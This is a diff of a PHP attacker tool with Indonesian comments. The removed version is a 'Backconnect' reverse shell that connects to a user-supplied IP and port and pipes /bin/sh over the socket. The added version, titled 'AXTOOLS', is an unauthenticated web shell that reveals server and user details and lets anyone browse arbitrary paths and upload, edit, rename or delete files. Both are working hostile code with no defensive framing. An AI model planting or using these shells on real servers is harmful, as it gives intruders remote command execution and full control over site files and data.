@@ -1,65 +1,231 @@
 <?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ip']) && isset($_POST['port'])) {
-    $ip = $_POST['ip'];
-    $port = $_POST['port'];
+// Report hanya error yang penting
+error_reporting(E_ALL & ~E_NOTICE);
 
-    // Membuka koneksi
-    $sock = fsockopen($ip, $port);
-    if (!$sock) {
-        die("Koneksi balik gagal ke $ip:$port.");
-    }
+// Fungsi untuk mendapatkan informasi ruang disk
+function getDiskSpace() {
+    $totalSpace = disk_total_space("/");
+    $freeSpace = disk_free_space("/");
+    $usedSpace = $totalSpace - $freeSpace;
+    $percentageFree = ($freeSpace / $totalSpace) * 100;
 
-    // Menghubungkan shell ke socket
-    $descriptorspec = array(
-        0 => array("pipe", "r"), // STDIN
-        1 => array("pipe", "w"), // STDOUT
-        2 => array("pipe", "w")  // STDERR
-    );
-    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
-
-    if (is_resource($process)) {
-        stream_set_blocking($pipes[1], false);
-        stream_set_blocking($pipes[2], false);
-        while (!feof($sock)) {
-            $data = fgets($sock);
-            if ($data) {
-                fwrite($pipes[0], $data);
-            }
-            $output = stream_get_contents($pipes[1]);
-            if ($output) {
-                fwrite($sock, $output);
-            }
-            $error = stream_get_contents($pipes[2]);
-            if ($error) {
-                fwrite($sock, $error);
-            }
-        }
-        fclose($pipes[0]);
-        fclose($pipes[1]);
-        fclose($pipes[2]);
-        proc_close($process);
-    }
-    fclose($sock);
-    die("Koneksi balik berhasil ke $ip:$port.");
+    return [
+        'total' => formatSize($totalSpace),
+        'free' => formatSize($freeSpace),
+        'percentage' => round($percentageFree, 2)
+    ];
 }
 
-?>
+// Format ukuran file
+function formatSize($size) {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $unitIndex = 0;
+    while ($size >= 1024 && $unitIndex < count($units) - 1) {
+        $size /= 1024;
+        $unitIndex++;
+    }
+    return round($size, 2) . " " . $units[$unitIndex];
+}
 
+// Fungsi untuk membuat path yang dapat diklik
+function getClickablePath($path) {
+    $pathParts = explode(DIRECTORY_SEPARATOR, $path);
+    $currentPath = '';
+    $clickablePath = '';
+
+    // Menambahkan root sebagai link pertama
+    $clickablePath .= '<a href="?cwd=">/</a>' . DIRECTORY_SEPARATOR;
+
+    foreach ($pathParts as $part) {
+        $currentPath .= DIRECTORY_SEPARATOR . $part;
+        $clickablePath .= '<a href="?cwd=' . urlencode($currentPath) . '">' . htmlspecialchars($part) . '</a>' . DIRECTORY_SEPARATOR;
+    }
+
+    return rtrim($clickablePath, DIRECTORY_SEPARATOR);
+}
+
+// Informasi sistem
+$disk = getDiskSpace();
+$cwd = isset($_GET['cwd']) ? $_GET['cwd'] : __DIR__;  // Default ke direktori file manager jika tidak ada parameter cwd
+$user = posix_getpwuid(posix_geteuid());
+$group = posix_getgrgid(posix_getegid());
+$phpVersion = phpversion();
+$uname = php_uname();
+
+// Parameter aksi dan target
+$action = $_GET['action'] ?? '';
+$target = $_GET['target'] ?? '';
+
+// Logika utama untuk menangani aksi
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    switch ($action) {
+        case 'upload':
+            $uploadDir = $cwd . '/';
+            $fileName = basename($_FILES['file']['name']);
+            $fileTmp = $_FILES['file']['tmp_name'];
+            move_uploaded_file($fileTmp, $uploadDir . $fileName);
+            break;
+        case 'create_file':
+            $newFile = basename($_POST['filename']);
+            file_put_contents($cwd . '/' . $newFile, "");
+            break;
+        case 'create_dir':
+            $newDir = basename($_POST['dirname']);
+            mkdir($cwd . '/' . $newDir);
+            break;
+        case 'edit':
+            $newContent = $_POST['content'];
+            file_put_contents($target, $newContent);
+            break;
+        case 'rename':
+            $newName = basename($_POST['newname']);
+            rename($target, $cwd . '/' . $newName);
+            break;
+    }
+    header("Location: ?cwd=" . urlencode($cwd));
+    exit;
+}
+
+if ($action === 'delete' && $target) {
+    is_dir($target) ? rmdir($target) : unlink($target);
+    header("Location: ?cwd=" . urlencode($cwd));
+    exit;
+}
+
+// Daftar file dalam direktori saat ini
+$files = scandir($cwd);
+$clickableCwd = getClickablePath($cwd);
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PHP Backconnect</title>
+    <title>AXTOOLS</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        h1, h2 {
+            color: #333;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background: #007bff;
+            color: #fff;
+        }
+        td a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        td a:hover {
+            text-decoration: underline;
+        }
+        .actions form {
+            display: inline-block;
+            margin-right: 10px;
+        }
+        button {
+            padding: 8px 15px;
+            background: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h1>PHP Backconnect Shell</h1>
-    <form method="POST">
-        <label for="ip">IP Address:</label><br>
-        <input type="text" id="ip" name="ip" placeholder="Masukkan IP Anda" required><br><br>
-        <label for="port">Port:</label><br>
-        <input type="number" id="port" name="port" placeholder="Masukkan Port Anda" required><br><br>
-        <button type="submit">Connect</button>
+<div class="container">
+    <h1>AXTOOLS</h1>
+    <h2>Server Info</h2>
+    <p><strong>Uname:</strong> <?= htmlspecialchars($uname); ?></p>
+    <p><strong>User:</strong> <?= htmlspecialchars($user['name']); ?> (<?= $user['uid']; ?>) | Group: <?= htmlspecialchars($group['name']); ?> (<?= $group['gid']; ?>)</p>
+    <p><strong>PHP Version:</strong> <?= htmlspecialchars($phpVersion); ?></p>
+    <p><strong>Current Directory:</strong> <?= htmlspecialchars($cwd); ?></p>
+    <h2>Disk Info</h2>
+    <p>Total Space: <?= $disk['total']; ?></p>
+    <p>Free Space: <?= $disk['free']; ?> (<?= $disk['percentage']; ?>% free)</p>
+
+    <h2>Files in <?= $clickableCwd; ?></h2>
+    <table>
+        <tr>
+            <th>Name</th>
+            <th>Type</th>
+            <th>Size</th>
+            <th>Actions</th>
+        </tr>
+        <?php foreach ($files as $file): ?>
+            <?php if ($file === '.' || $file === '..') continue; ?>
+            <tr>
+                <td>
+                    <?php if (is_dir($file)): ?>
+                        <a href="?cwd=<?= urlencode($cwd . '/' . $file); ?>"><?= htmlspecialchars($file); ?></a>
+                    <?php else: ?>
+                        <a href="?action=edit&target=<?= urlencode($cwd . '/' . $file); ?>"><?= htmlspecialchars($file); ?></a>
+                    <?php endif; ?>
+                </td>
+                <td><?= is_dir($file) ? 'Directory' : 'File'; ?></td>
+                <td><?= is_file($file) ? formatSize(filesize($file)) : '-'; ?></td>
+                <td class="actions">
+                    <?php if (is_file($file)): ?>
+                        <a href="?action=edit&target=<?= urlencode($cwd . '/' . $file); ?>">Edit</a> |
+                    <?php endif; ?>
+                    <a href="?action=rename&target=<?= urlencode($cwd . '/' . $file); ?>">Rename</a> |
+                    <a href="?action=delete&target=<?= urlencode($cwd . '/' . $file); ?>" onclick="return confirm('Delete this?')">Delete</a>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+    </table>
+
+    <?php if ($action === 'edit' && is_file($target)): ?>
+        <h2>Edit File: <?= htmlspecialchars($target); ?></h2>
+        <form action="?action=edit&target=<?= urlencode($target); ?>" method="POST">
+            <textarea name="content"><?= htmlspecialchars(file_get_contents($target)); ?></textarea>
+            <button type="submit">Save Changes</button>
+        </form>
+    <?php endif; ?>
+
+    <h2>Actions</h2>
+    <form action="?action=upload" method="POST" enctype="multipart/form-data">
+        <input type="file" name="file" required>
+        <button>Upload</button>
     </form>
+
+    <form action="?action=create_file" method="POST">
+        <input type="text" name="filename" placeholder="File name" required>
+        <button>Create File</button>
+    </form>
+
+    <form action="?action=create_dir" method="POST">
+        <input type="text" name="dirname" placeholder="Directory name" required>
+        <button>Create Directory</button>
+    </form>
+</div>
 </body>
 </html>
